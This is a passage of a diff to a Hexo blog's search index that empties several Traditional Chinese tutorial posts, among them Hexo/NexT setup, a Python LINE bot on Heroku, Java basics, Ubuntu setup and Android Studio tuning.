-使用 npm 來安裝 hexo (須先安裝 Node.js)
-$ npm install hexo-cli -g
-安裝成功後，輸入以下指令可查看版本
-$ hexo version
-接下來即可初始化我們的部落格了
-$ hexo init blog       # 初始化 blog$ cd blog              # 移動到剛創建的 blog 資料夾裡$ npm install		# 安裝相關套件
-將 Hexo 配置到 GitHub
-去 GitHub 官網登入。
-新增一個倉庫(Repositories)
-
-倉庫名稱為 yourname.github.io
-
-上面的 yourname 請替換成你 GitHub 的帳號名稱
-
-
-看到這頁代表即可退出
-
-再來到 blog 資料夾下找一個 _config.yml 的檔案，這是 Hexo 的全域配置文件
-
-開啟之後，拉到檔案最底部，可以看到
-deploy:  type:
-將以下資訊對應輸入
-deploy:  type: git  repository: http://github.com/yourname/yourname.github.io.git  branch: master
-
-設定中的 “:” 後一定要有一個空格
-將上面的 yourname 改成妳的 GitHub 帳號名稱
-
-產生靜態文件後，部署上 GitHub
-$ hexo d -g
-再來就可以上 https://yourname.github.io/ 查看是否部署成功
-成功之後，就可以開始做一些優化和寫文章啦。
-
-將上面的 yourname 替換成你 GitHub 的帳號名稱
-
-Hexo 配置檔介紹
-_config.yml 是 hexo 的預設設定黨，其設定是用 yaml 格式編寫。
-yaml 檔裡，&quot;:&quot;後一定要有一個空格
-下面是 hexo 的預設配置，可以自修改。
-# Sitetitle: /標題(會顯示在網頁標題與頁首)/subtitle: /子標題(顯示在頁首)/description: /內容描述(給搜尋引擎看的)/author: /作者(顯示在頁尾)/language: /網站預設語言(台灣:zh-tw)/timezone: /時區(預設使用你電腦的時區)/# URLurl: /網站的網域位址/root: /網站根目錄/permalink: /文章目錄(預設使用 YYYY\MM\DD\文章名稱)/# Extensionstheme: /網站的佈景主題/       (可以到"https://hexo.io/themes/"下載喜歡的佈景放置到 theme 目錄裡)# Deploymentdeploy:    type: /發佈型態/ 例如(git、heroku、rsync、openshift、ftpsync)    repository: /部署位置/ 例如(git@github.com:帳號/REPO名.git)    branch: /分支/ 例如(master、gh-pages)    message: /部署訊息/
-使用 NexT 主題
-本站使用主題為 NexT.Pisces 主題。
-如何使用，可以參考 官方教學文件，上面寫的很詳細，而且是中文的教學！
-發布文章
-創建文章
-$ hexo new [postName]
-備註：將 [postName] 換成你的文章名稱 (以英文尤佳)
-前往 source / _post 資料夾中，打開 [postName].md 文件，在最下面新增 Markdown 語法的內容。
-修改完後，執行以下指令，就可以將新的變更發佈到部落格上囉！
-$ hexo d -g    # d = 部署, g = 生成
-等一段時間，就可以看到你剛剛打的文章囉！
-如果你要先在本地端看看效果，也可以改成以下指令
-$ hexo server
-不熟悉 Markdown 的人，可以去看看這篇 Markdown 語法教學
-如果想嘗試編寫 Markdown，或是想找一個好用的Markdown 編輯器，可以嘗試使用 HackMD。
-刪除文章
-首先進入到 source / _post 資料夾中，找到 helloworld.md 文件，在本地直接執行刪除。
-
-執行以下指令
-$ hexo clean    # 清除快取檔案和已產生的靜態檔案。$ hexo d -g     # d = deploy, g = generate
-等一段時間，就會發現那篇文章已經消失囉！
-使用第三方擴充服務
-本站有使用以下第三方服務，有興趣可以去看看。
-
-DISQUS：評論系統
-Local Search：搜尋系統
-文章摘要顯示使用：優化主頁文章摘要
-不蒜子统计：瀏覽量統計
-
-客製化設定
-本站參考了以下幾篇文章，修改了一些顯示效果，有興趣可以看看。
-
-讓NexT主題的Markdown H2自動產生底線
-讓NexT主題的List不只有圓形
-修改文章底部的那个带#号的标签
-動態背景
-
-登錄搜尋引擎
-如果只支援 Google 可以參考這篇 Next+Google Webmaster tools，
-如果也想支援百度，可以參考這篇 Hexo+Next主题博客提交百度谷歌收录。
-GitHub 會擋百度爬蟲。如果你建在 GitHub 上，百度會搜尋不到
-
-要避免讓 GitHub 網站被百度擋，有一個解法，可以參考看看
-使用coding.me加速Hexo博客访问
-SEO 優化
-可以參考這篇，基于Hexo中Next主题的SEO优化指南。
-強化 Markdown renderer
-執行以下指令，將原生 Markdown 改為 Markdown-it
-$ npm un hexo-renderer-marked --save    # 刪除原生 Markdown$ npm i hexo-renderer-markdown-it --save    # 安裝 Markdown-it
-新增標籤頁
-可以參考 NexT 官網的這篇教學 添加「标签」页面。
-新增分類頁
-可以參考 NexT 官網的這篇教學 添加「分类」页面。
-新增關於頁
-可以參考 NexT 官網的這篇教學 Hexo about页面怎么写 Next关于页面怎么设置。
-性能優化
-性能優化最主要的就是壓縮網頁大小，一開始有試過使用大多數人推的 hexo-neat，但結果一直失敗QwQ
-因此決定改用 gulp 來做壓縮。
-
-Hexo博客-Next性能优化之路
-hexo博客加速之页面压缩
-
-文章編輯後台
-先下結論：難用，不建議使用！
-建議可以在自己熟悉的 markdown 編輯器編輯就好。
-如果覺得編輯完無法立即看到結果，或是結果和本地編輯器有差，可以試著使用看看 hexo-admin，hexo-admin 博客后端管理工具
-參考資料
-Hexo部落格建立筆記 | SkyLake’s Blog
-Hexo 官方網站
-NexT 官方網站
-]]></content>
+    <content><![CDATA[]]></content>
       <categories>
         <category>Hexo</category>
       </categories>
       <tags>
-        <tag>教學</tag>
         <tag>Hexo</tag>
         <tag>NexT</tag>
+        <tag>教學</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何在 Centos 7 創建一個 Sudo user</title>
+    <url>/how-to-create-a-sudo-user-on-centos-quickstart/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>教學</tag>
+        <tag>CentOS</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NotificationCompat 與 Notification 差別</title>
+    <url>/notificationcompat-vs-notification/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>Android</category>
+      </categories>
+      <tags>
+        <tag>Android</tag>
+        <tag>Notification</tag>
       </tags>
   </entry>
   <entry>
     <title>LineBot+Python，輕鬆建立聊天機器人</title>
     <url>/line-bot-tutorial/</url>
-    <content><![CDATA[
-本教學由 北科程式設計研究社 所屬
-喜歡這篇教學，可以到我的 Github 上面給我一顆 Star
-[name=姚韋辰]
-
-本教程介紹如何使用 Python LINE Bot SDK 在 Heroku 上架設一個簡單的回話機器人。
-
-如果您想以另一種語言架設範例 bot，請參閱以下  LINE Bot SDK repositories。
-
-PHP
-Go
-Perl
-Ruby
-Python
-Node.js
-
-在你開始之前
-確保您具有以下內容：
-
-擁有 Line 帳號
-擁有 Heroku 帳戶（您可以免費創建一個）
-
-建立 Heroku 專案
-
-登入 Heroku 後，
-在 Heroku 頁面中，點選 New -&gt; Create New App
-
-輸入自己喜歡的 App name ，然後點擊 Create app
-
-
-創建 Line Bot 頻道
-
-進入 Line 控制台
-
-創建提供者
-
-填入提供者名稱
-
-點擊 Create
-
-點擊 Create Channel
-
-填入 Bot 資訊
-
-同意 Line 條款，並按 Create
-
-選擇剛剛創建的 Bot
-
-
-設定範例機器人
-按照以下步驟架設一個回話機器人。
-
-
-下載 範例程式碼
-
-
-進入 Line 控制台，選擇你剛剛創建的機器人
-
-
-
-開啟 webhook
-
-
-
-
-關閉預設罐頭回覆訊息
-
-
-
-產生 Channel access token
-
-
-
-
-取得 Channel access token
-
-
-
-取得 Channel secret
-
-
-
-使用編輯器開啟範例程式碼資料夾內的 app.py，將剛剛取得的 channel secret 和 channel access token 填入
-
-
-
-將程式推到 Heroku 上
-
-
-下載並安裝 Heroku CLI、Git
-
-
-開啟剛剛下載的範例程式碼資料夾，在路徑上輸入 cmd
-
-
-使用終端或命令行應用程序登錄到 Heroku
- heroku login
-
-
-初始化 git
- $ git config --global user.name "你的名字"$ git config --global user.email 你的信箱
-注意：你的名字 和 你的信箱 要換成各自的 名字 和 信箱
-
-
-初始化 git
- git init
-注意：僅第一次使用時要輸入
-
-
-用 git 將資料夾與 heroku 連接
- heroku git:remote -a &#123;HEROKU_APP_NAME&#125;
-注意：{HEROKU_APP_NAME} 是 Heroku 應用的名稱
-
-
-輸入以下指令，將程式碼推上 Heroku，如果有跳出錯誤請重新輸入
- git add .git commit -m "Add code"git push -f heroku master
-每當需要更新 Bot 時，請重新輸入上述指令
-
-
-將 Heroku 與 Line 綁定
-
-
-進入 Line 控制台，選擇你剛剛創建的 Bot
-
-
-
-在 webhook URL 中輸入 Heroku 網址
- &#123;HEROKU_APP_NAME&#125;.herokuapp.com/callback
-
-注意：{HEROKU_APP_NAME} 是 Heroku 應用的名稱
-
-
-測試範例成果
-
-進入 Line 控制台，選擇你剛剛創建的 Bot
-
-通過在控制台的 “Channel settings” 頁面上掃描 QR Code，將您的 Bot 添加到 LINE 的朋友中
-在 Line 上向您的 Bot 發送文字訊息，並確認它會學你說話
-
-錯誤尋找
-
-當程式遇到問題時，可查看日誌以找出錯誤
-
-要查看您的 Bot 在 Heroku 的日誌，請按照以下步驟。
-
-
-如果沒登入，請先透過 Heroku CLI 登入
- heroku login
-
-
-顯示 app 日誌
- heroku logs --tail --app &#123;HEROKU_APP_NAME&#125;
-注意：{HEROKU_APP_NAME} 是上述步驟2中的應用名稱。
- --tail                     # 持續打印日誌--app &#123;HEROKU_APP_NAME&#125;    # 指定 App
-
-
-程式檔案解說
-
-資料夾裡需含有兩份文件來讓你的程式能在 heroku 上運行
-
-
-Procfile：heroku 執行命令，web: {語言} {檔案}，這邊語言為 python，要自動執行的檔案為 app.py，因此我們改成 web: python app.py。
-requirements.txt：列出所有用到的套件，heroku 會依據這份文件來安裝需要套件
-
-app.py (主程式)
-可透過修改程式裡的 handle_message() 方法內的程式碼來控制機器人的訊息回覆
-
-新版範例程式碼內附註解
-如想更多了解此程式，可以去研究 Git、Python3、Flask 套件、Line bot sdk
-進階操作
-官方文件
-回覆訊息
-只有當有訊息傳來，才能回覆訊息
-line_bot_api.reply_message(reply_token, 訊息物件)
-主動傳送訊息
-Bot 需要有開啟 push 功能才可以做，否則程式會出錯
-line_bot_api.push_message(push_token, 訊息物件)
-訊息物件分類
-官方文件
-修改範例程式碼中， handle_message() 方法內的程式碼，可實現多種功能
-TextSendMessage （文字訊息）
-![](https://i.imgur.com/LieCFAb.png =250x)
-message = TextSendMessage(text='Hello, world')line_bot_api.reply_message(event.reply_token, message)
-ImageSendMessage（圖片訊息）
-![](https://i.imgur.com/RaH7gqo.png =250x)
-message = ImageSendMessage(    original_content_url='https://example.com/original.jpg',    preview_image_url='https://example.com/preview.jpg')line_bot_api.reply_message(event.reply_token, message)
-VideoSendMessage（影片訊息）
-![](https://i.imgur.com/o6cvf3o.png =250x)
-message = VideoSendMessage(    original_content_url='https://example.com/original.mp4',    preview_image_url='https://example.com/preview.jpg')line_bot_api.reply_message(event.reply_token, message)
-AudioSendMessage（音訊訊息）
-![](https://i.imgur.com/w5szZag.png =250x)
-message = AudioSendMessage(    original_content_url='https://example.com/original.m4a',    duration=240000)line_bot_api.reply_message(event.reply_token, message)
-LocationSendMessage（位置訊息）
-![](https://i.imgur.com/tXE7Aus.png =250x)
-message = LocationSendMessage(    title='my location',    address='Tokyo',    latitude=35.65910807942215,    longitude=139.70372892916203)line_bot_api.reply_message(event.reply_token, message)
-StickerSendMessage（貼圖訊息）
-![](https://i.imgur.com/7x0mgK1.png =250x)
-message = StickerSendMessage(    package_id='1',    sticker_id='1')line_bot_api.reply_message(event.reply_token, message)
-ImagemapSendMessage （組圖訊息）
-![](https://i.imgur.com/MoSf2D6.png =250x)
-message = ImagemapSendMessage(    base_url='https://example.com/base',    alt_text='this is an imagemap',    base_size=BaseSize(height=1040, width=1040),    actions=[        URIImagemapAction(            link_uri='https://example.com/',            area=ImagemapArea(                x=0, y=0, width=520, height=1040            )        ),        MessageImagemapAction(            text='hello',            area=ImagemapArea(                x=520, y=0, width=520, height=1040            )        )    ])line_bot_api.reply_message(event.reply_token, message)
-TemplateSendMessage - ButtonsTemplate （按鈕介面訊息）
-![](https://i.imgur.com/41lXWjP.png =250x)
-message = TemplateSendMessage(    alt_text='Buttons template',    template=ButtonsTemplate(        thumbnail_image_url='https://example.com/image.jpg',        title='Menu',        text='Please select',        actions=[            PostbackTemplateAction(                label='postback',                text='postback text',                data='action=buy&amp;itemid=1'            ),            MessageTemplateAction(                label='message',                text='message text'            ),            URITemplateAction(                label='uri',                uri='http://example.com/'            )        ]    ))line_bot_api.reply_message(event.reply_token, message)
-TemplateSendMessage - ConfirmTemplate（確認介面訊息）
-![](https://i.imgur.com/U8NDhrt.png =250x)
-message = TemplateSendMessage(    alt_text='Confirm template',    template=ConfirmTemplate(        text='Are you sure?',        actions=[            PostbackTemplateAction(                label='postback',                text='postback text',                data='action=buy&amp;itemid=1'            ),            MessageTemplateAction(                label='message',                text='message text'            )        ]    ))line_bot_api.reply_message(event.reply_token, message)
-TemplateSendMessage - CarouselTemplate
-![](https://i.imgur.com/982Glgo.png =250x)
-message = TemplateSendMessage(    alt_text='Carousel template',    template=CarouselTemplate(        columns=[            CarouselColumn(                thumbnail_image_url='https://example.com/item1.jpg',                title='this is menu1',                text='description1',                actions=[                    PostbackTemplateAction(                        label='postback1',                        text='postback text1',                        data='action=buy&amp;itemid=1'                    ),                    MessageTemplateAction(                        label='message1',                        text='message text1'                    ),                    URITemplateAction(                        label='uri1',                        uri='http://example.com/1'                    )                ]            ),            CarouselColumn(                thumbnail_image_url='https://example.com/item2.jpg',                title='this is menu2',                text='description2',                actions=[                    PostbackTemplateAction(                        label='postback2',                        text='postback text2',                        data='action=buy&amp;itemid=2'                    ),                    MessageTemplateAction(                        label='message2',                        text='message text2'                    ),                    URITemplateAction(                        label='uri2',                        uri='http://example.com/2'                    )                ]            )        ]    ))line_bot_api.reply_message(event.reply_token, message)
-TemplateSendMessage - ImageCarouselTemplate
-![](https://i.imgur.com/2ys1qqc.png =250x)
-message = TemplateSendMessage(    alt_text='ImageCarousel template',    template=ImageCarouselTemplate(        columns=[            ImageCarouselColumn(                image_url='https://example.com/item1.jpg',                action=PostbackTemplateAction(                    label='postback1',                    text='postback text1',                    data='action=buy&amp;itemid=1'                )            ),            ImageCarouselColumn(                image_url='https://example.com/item2.jpg',                action=PostbackTemplateAction(                    label='postback2',                    text='postback text2',                    data='action=buy&amp;itemid=2'                )            )        ]    ))line_bot_api.reply_message(event.reply_token, message)
-]]></content>
+    <content><![CDATA[]]></content>
       <categories>
         <category>LineBot</category>
       </categories>
@@ -1157,37 +173,14 @@ message = TemplateSendMessage(    alt_text='ImageCarousel template',    template
       </tags>
   </entry>
   <entry>
-    <title>NotificationCompat 與 Notification 差別</title>
-    <url>/notificationcompat-vs-notification/</url>
-    <content><![CDATA[Notification.Builder 是 Android 3.0 (API 11) 引入的。如要兼容低版本，可以使用 Support V4 包提供的 NotificationCompat.Builder。
-
-Android 3.0 以上選擇 Notification
-Android 3.0 以下選擇 NotificationCompat
-
-]]></content>
-      <categories>
-        <category>Android</category>
-      </categories>
-      <tags>
-        <tag>Android</tag>
-        <tag>Notification</tag>
-      </tags>
+    <title>使用 Parallels Desktop Lite 安裝 Ubuntu 16.04（macOS）</title>
+    <url>/%E4%BD%BF%E7%94%A8-Parallels-Desktop-Lite-%E5%AE%89%E8%A3%9D-Ubuntu-16-04%EF%BC%88macOS%EF%BC%89/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>在 static method  中取得 String Resource</title>
     <url>/%E5%9C%A8-static-method-%E5%8F%96%E5%BE%97-String-Resourse/</url>
-    <content><![CDATA[遇到問題
-最近在寫一個 Singleton 的類別時，遇到需要透過 Resource id 取得 string 的需求，原本想用 context.getString(int resId) 的方式取得，但發現 Context 不適合被 static 成員或類別引用，會導致內存泄露。
-
-static 成員生命週期會隨著 app 開始到結束。
-如果引用到 Context、Activity，會導致 Context、Activity 也跟著無法被回收，導致內存泄露。
-
-解決辦法
-使用 Resources.getSystem().getString(int resId) 來取得 String。
-參考資料
-https://segmentfault.com/q/1010000008131979
-https://stackoverflow.com/questions/3822732/android-getstringr-string-in-static-method
-]]></content>
+    <content><![CDATA[]]></content>
       <categories>
         <category>Android</category>
       </categories>
@@ -1196,403 +189,9 @@ https://stackoverflow.com/questions/3822732/android-getstringr-string-in-static-
       </tags>
   </entry>
   <entry>
-    <title>使用 Parallels Desktop Lite 安裝 Ubuntu 16.04（macOS）</title>
-    <url>/%E4%BD%BF%E7%94%A8-Parallels-Desktop-Lite-%E5%AE%89%E8%A3%9D-Ubuntu-16-04%EF%BC%88macOS%EF%BC%89/</url>
-    <content><![CDATA[安裝 Parallels Desktop Lite
-到 Mac App Store 上面可以找到
-
-安裝 Ubuntu 16.04
-
-
-開啟 Parallels Desktop Lite
-
-
-
-安裝 Ubuntu
-
-
-
-選取你下載的 Ubuntu 映像檔，並點擊繼續
-
-
-
-取消勾選『快速安裝』，並點擊繼續
-
-
-
-勾選安裝前設定，可以社設定虛擬機配置
-
-
-
-點擊配置已設定虛擬機，然後點擊繼續來開始安裝
-
-
-
-選擇語言
-
-
-
-選擇「安裝 Ubuntu」（如果想先試用，但不安裝，可以點第一項）
-
-
-
-選擇安裝過程的語言
-
-
-
-建議全部勾選，也可以選擇自己想要的勾選
-
-
-
-如果是在虛擬機中安裝，不需分隔磁碟，直接選第一個，然後按「立即安裝」
-
-
-
-點擊「繼續」開始安裝
-
-
-
-選擇時區
-
-
-
-選擇鍵盤排列方試（台灣鍵盤為美式鍵盤）
-
-
-
-輸入使用者帳戶資訊
-
-
-
-等待安裝並重新開機
-
-
-
-註：如果重新開機失敗，可以點選下圖的重新啟動
-
-
-Parellels 解析度調整
-
-
-重新開機後，點擊 Parallels 上方的操作選單，並點擊安裝 Parallels Tools，依照指示完成安裝。
-
-
-
-確認螢幕設定為「縮放」
-
-
-
-點擊「系統設定值」的按鈕
-
-
-
-點擊「顯示器」
-
-
-
-在這裡可以調整螢幕的解析度（Macbook 建議調成 1440x900）
-
-
-
-]]></content>
-  </entry>
-  <entry>
-    <title>在 Ubuntu 上安裝中文輸入法</title>
-    <url>/%E5%9C%A8Ubuntu%E4%B8%8A%E5%AE%89%E8%A3%9D%E4%B8%AD%E6%96%87%E8%BC%B8%E5%85%A5%E6%B3%95/</url>
-    <content><![CDATA[
-點擊「系統設定值」的按鈕
-
-
-
-
-
-點擊「語言支援」
-
-
-
-第一次打開，會跳出「安裝語言尚未支援完備」，這邊點擊「安裝」
-
-
-
-這邊會讓你輸入你剛剛設定的密碼，並等待安裝完畢
-
-
-
-安裝完後重新開機
-
-
-
-開機完後點右上角的鍵盤圖示，然後點選「ConfigureFcitx」
-
-
-
-點選左下角的「＋」來新增輸入法
-
-
-
-這邊推薦安裝「新酷音」
-
-
-
-安裝完後可以在輸入法列表裡看到你剛剛選擇的輸入法，這邊可以調整輸入法順序
-
-
-
-]]></content>
-  </entry>
-  <entry>
     <title>型態、變數與運算子 - Java</title>
     <url>/%E5%9E%8B%E6%85%8B%E3%80%81%E8%AE%8A%E6%95%B8%E8%88%87%E9%81%8B%E7%AE%97%E5%AD%90-Java/</url>
-    <content><![CDATA[資料型態
-何謂資料型態？
-程式儲存資料的型態
-
-認識資料型態
-常常聽到別人提到 Java 是物件導向語言，不過 Java 本身並不是純綷的物件導向語言，像是就型態系統而言，Java 就並非每個值都是物件，而是混合了兩個型態系統：基本型態（Primitive type）與物件型態（Object type）。
-基本型態（Primitive type）
-在 Java 語言中有八種基本型態( Primitive Type )，可分作四個大類
-
-整數型態：byte、short、int、long
-浮點數型態：float、double
-字元型態：char
-邏輯型態：boolean
-
-整數型態
-用於儲存整數
-
-
-
-型態
-長度
-範圍
-
-
-
-
-byte
-8 bits
-−2^7^到2^7^−1
-
-
-short
-16 bits
-−2^15^到2^15^−1
-
-
-int
-32 bits
-−2^31^到2^31^−1
-
-
-long
-64 bits
-−2^63^到2^63^−1
-
-
-
-浮點數型態
-用於儲存小數，double浮點數使用的記憶體空間比float浮點數來得多，可表示的精確度也比較大。想要了解確切的範圍，可以自行Google
-
-
-
-型態
-長度
-
-
-
-
-float
-32 bits
-
-
-double
-64 bits
-
-
-
-字元型態
-char型態用來儲存'A'、'B'、'林'等字元符號。每個字元型態佔兩個位元組，中文字元與英文字元在Java中同樣都是用兩個位元組儲存。
-布林型態
-boolean型態可儲存true與false，分別代表邏輯的「真」與「假」。
-變數
-不懂變數概念的可以參考這篇，https://openhome.cc/Gossip/Java/Variable.html
-變數命名規則
-類別以英文大寫字母開頭，若有多個英文單字組成，採取大寫駝峰型 (upper camel case)
-
-SampleItem
-MyData
-MySimpleThread
-MainActivity
-
-方法或變數（包括參數、屬性等）以英文小寫字母開頭，若有多個英文單字組成，採取小寫駝峰型 (lower camel case)
-
-setUpNetworking
-getView
-myActivity
-
-運算子
-單元運算子
-
-
-
-運算子
-功能
-範例
-
-
-
-
-+
-正
-+a
-
-
--
-負
--a
-
-
-++
-遞增
-++a, a++
-
-
---
-遞減
---a, a--
-
-
-!
-反轉
-!a
-
-
-
-boolean a = true;boolean b = !a;    // b 會等於 falseboolean c = !b;    // c 會等於 true
-一般運算子
-下面為一般運算子，皆須結合兩個運算元，可用在整數及浮點數，計算結果為整數或浮點數
-
-
-
-運算子
-功能
-範例
-
-
-
-
-+
-加
-a + b
-
-
--
-減
-a - b
-
-
-*
-乘
-a * b
-
-
-/
-除
-a / b
-
-
-%
-取餘數
-a % b
-
-
-
-關係運算子
-下面為關係運算子，計算結果不是true就是false
-
-
-
-運算子
-功能
-範例
-
-
-
-
-==
-相等
-a == b
-
-
-!=
-不相等
-a != b
-
-
-&gt;
-大於
-a &gt; b
-
-
-&gt;=
-大於等於
-a &gt;= b
-
-
-&lt;
-小於
-a &lt; b
-
-
-&lt;=
-小於等於
-a &lt;= b
-
-
-
-指派運算子
-
-
-
-運算子
-功能
-範例
-
-
-
-
-=
-指派
-a = b
-
-
-+=
-相加同時指派
-a += b
-
-
--=
-相減同時指派
-a -= b
-
-
-*=
-相乘同時指派
-a *= b
-
-
-/=
-相除同時指派
-a /= b
-
-
-%=
-取餘數同時指派
-a %= b
-
-
-
-]]></content>
+    <content><![CDATA[]]></content>
       <categories>
         <category>Java</category>
       </categories>
@@ -1601,31 +200,14 @@ a %= b
       </tags>
   </entry>
   <entry>
+    <title>在 Ubuntu 上安裝中文輸入法</title>
+    <url>/%E5%9C%A8Ubuntu%E4%B8%8A%E5%AE%89%E8%A3%9D%E4%B8%AD%E6%96%87%E8%BC%B8%E5%85%A5%E6%B3%95/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>條件式與迴圈 - Java</title>
     <url>/%E6%A2%9D%E4%BB%B6%E5%BC%8F%E8%88%87%E8%BF%B4%E5%9C%88-Java/</url>
-    <content><![CDATA[為了告訴電腦特定條件下該做什麼動作，要使用各種條件式來定義程式執行的流程。
-條件式
-「如果OOO成立，就要…」，Java提供了 if...else 條件式，語法如下：
-
-if…else
-if (條件式一) &#123;    陳述句;  &#125; else if (條件式二) &#123;    陳述句;&#125; else &#123;    陳述句;&#125;
-條件式運算結果為 true 會執行 if 的 { 與 } 中的陳述句，否則執行下一個條件式，如果所有條件是都不符合，則執行 else 的 { 與 } 中的陳述句，如果條件式不成立時並不想作任何事，則 else 可以省略。
-switch
-switch (變數或運算式) &#123;       case 整數、字元、字串:           陳述句;           break;       case 整數、字元、字串:           陳述句;           break;       default:           陳述句;   &#125;
-首先看看 switch 的括號，當中置放要取得值的變數或運算式，值必須是整數、字元、字串，取得值後會開始與 case 中設定的整數、字元、字串比對，如果符合就執行之後的陳述句，直到遇到 break，則離開 switch 區塊，如果沒有符合的整數、字元、字串，則會執行 default 後的陳述句，default 不一定需要，如果沒有預設要處理的動作，可以省略 default。
-迴圈
-在 Java 中如果要進行重複性指令執行，可以使用 for 迴圈式或 while 迴圈
-for
-for (初始式; 執行結果必須是boolean的重複式; 重複式) &#123;      陳述句;   &#125;
-while
-while (條件式) &#123;      陳述句;   &#125;
-do…while
-do &#123;       陳述句;   &#125; while (條件式);
-break
-跳出迴圈
-continue
-進行下一次迴圈
-]]></content>
+    <content><![CDATA[]]></content>
       <categories>
         <category>Java</category>
       </categories>
@@ -1636,24 +218,7 @@ continue
   <entry>
     <title>解決 Android Studio 卡頓的問題</title>
     <url>/%E8%A7%A3%E6%B1%BAAndroid-Studio%E5%8D%A1%E9%A0%93%E7%9A%84%E5%95%8F%E9%A1%8C/</url>
-    <content><![CDATA[問題描述
-在使用 Macbook Pro 13 2017 開發案子，發現 Android Studio 會常常出現卡頓。
-
-解決辦法
-上網查了一下，發現不少人都有這種狀況。問題好像是出在 Android Studio 的啟動參數限制了 JVM 獲得足夠的記憶體，導致了運行時只能頻繁的與磁盤交換。
-因此我們要修改一下 Android Studio 的 JVM 參數文件，他的問位置在：
-&#x2F;Applications&#x2F;Android\ Studio.app&#x2F;Contents&#x2F;bin&#x2F;studio.vmoptions
-在我的電腦上，參數預設是：
--Xms256m-Xmx1280m-XX:ReservedCodeCacheSize&#x3D;240m-XX:+UseCompressedOops
-在修改重要設定檔之前，建議先做備份：
-cd &#x2F;Applications&#x2F;Android\ Studio.app&#x2F;Contents&#x2F;bin&#x2F;cp studio.vmoptions studio.vmoptions.bak
-以上為 bash 指令，請打開 terminal 輸入。
-第一句是移動到存放 studio.vmoptions 的資料夾底下
-第二句是將 studio.vmoptions 複製一份備份，並將其命名為 studio.vmoptions.bak
-然後修改 studio.vmoptions 成這樣：
--Xms512m-Xmx2048m-XX:ReservedCodeCacheSize&#x3D;768m-XX:+UseCompressedOops
-如果覺得你記憶體足夠大，可以將 -Xmx 後面的數字改更大。我的電腦為記憶體為 8G，因此我設 2048m。
-]]></content>
+    <content><![CDATA[]]></content>
       <categories>
         <category>Android Studio</category>
       </categories>
